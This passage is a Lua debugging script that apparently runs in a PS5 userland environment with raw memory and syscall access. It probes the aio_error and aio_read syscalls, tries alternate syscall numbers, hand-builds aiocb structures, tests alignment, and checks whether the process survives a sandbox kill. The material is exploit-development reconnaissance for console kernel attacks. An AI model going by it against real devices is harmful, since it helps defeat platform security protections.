log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_close = 6,
    sc_write = 4,
    sc_open = 5,
    sc_socketpair = 135,
    sc_getpid = 20,
    sc_aio_error = 315,
})

-- ============================================================
-- PART 1: Verify aio_error still works
-- ============================================================
log("")
log("--- PART 1: aio_error baseline ---")

local dummy = memory.alloc(512)
for i = 0, 511, 8 do memory.write_qword(dummy + i, 0) end

local ae_ok, ae_ret = pcall(function() return syscall.sc_aio_error(dummy) end)
log("  aio_error: " .. (ae_ok and "rv=" .. ae_ret:tonumber() or "CRASH"))

-- ============================================================
-- PART 2: Test if the issue is the syscall number
-- Maybe PS5 uses different numbers for aio_read
-- Try raw syscall approach: resolve with different numbers
-- ============================================================
log("")
log("--- PART 2: alternate aio_read numbers ---")

-- Standard FreeBSD: aio_read=255
-- But PS5 might remap to a different number
-- Let's check what's near 255

local alt_nums = {255, 256, 319, 320, 386, 387, 500, 501}
for _, num in ipairs(alt_nums) do
    local name = "aio_alt_" .. num
    local tbl = {}
    tbl[name] = num

    local rok = pcall(function() syscall.resolve(tbl) end)
    if rok then
        -- Try calling it with our aiocb
        local cb = memory.alloc(512)
        local buf = memory.alloc(256)
        for i = 0, 511, 8 do memory.write_qword(cb + i, 0) end

        -- Open /dev/null for a safe fd
        local nok, nret = pcall(function() return syscall.sc_open("/dev/null", 2) end)
        local nfd = nok and nret:tonumber() or -1

        if nfd >= 0 then
            memory.write_dword(cb, nfd)
            memory.write_qword(cb + 16, buf)
            memory.write_qword(cb + 24, 16)

            local t_ok, t_ret = pcall(function() return syscall[name](cb) end)
            log(string.format("  syscall %d: %s", num,
                t_ok and "rv=" .. t_ret:tonumber() or "ERR: " .. tostring(t_ret):sub(1, 30)))

            pcall(function() syscall.sc_close(nfd) end)
        end
    else
        log(string.format("  syscall %d: resolve FAIL", num))
    end
end

-- ============================================================
-- PART 3: Test if the problem is the aiocb pointer value
-- Maybe the Lua API passes the wrong thing to the kernel
-- Use a huge allocation to ensure alignment
-- ============================================================
log("")
log("--- PART 3: alignment test ---")

syscall.resolve({ sc_aio_read = 255 })

-- Allocate a very large buffer and use aligned address
local big = memory.alloc(65536)
-- Align to 4096 boundary
local aligned = big
local mod = big % 4096
if mod ~= 0 then aligned = big + (4096 - mod) end

local rbuf3 = memory.alloc(4096)
for i = 0, 511, 8 do memory.write_qword(aligned + i, 0) end

-- /dev/null
local n3_ok, n3_ret = pcall(function() return syscall.sc_open("/dev/null", 0) end)
local nfd3 = n3_ok and n3_ret:tonumber() or -1
log("  /dev/null fd=" .. nfd3)

if nfd3 >= 0 then
    memory.write_dword(aligned, nfd3)
    memory.write_qword(aligned + 8, 0)
    memory.write_qword(aligned + 16, rbuf3)
    memory.write_qword(aligned + 24, 1)  -- just 1 byte

    log("  aiocb at " .. string.format("0x%x", aligned) .. " (4K aligned)")

    local r3_ok, r3_ret = pcall(function() return syscall.sc_aio_read(aligned) end)
    log("  aio_read: " .. (r3_ok and "rv=" .. r3_ret:tonumber() or "CRASH"))

    if r3_ok then
        log("  *** WORKS WITH ALIGNED AIOCB ***")
    end

    pcall(function() syscall.sc_close(nfd3) end)
end

-- ============================================================
-- PART 4: Test if it's a sandbox kill (SIGKILL from kernel)
-- vs a crash (SIGSEGV). If sandbox, no amount of fixing helps.
-- We can check by seeing if subsequent syscalls work after
-- the pcall catches the error
-- ============================================================
log("")
log("--- PART 4: post-crash liveness ---")

local alive = pcall(function() return syscall.sc_getpid() end)
log("  alive after all tests: " .. tostring(alive))

if alive then
    log("  PID: " .. syscall.getpid():tonumber())
end

log("")
log("=== AIO DEBUG DONE ===")
return table.concat(out, "\n")
```
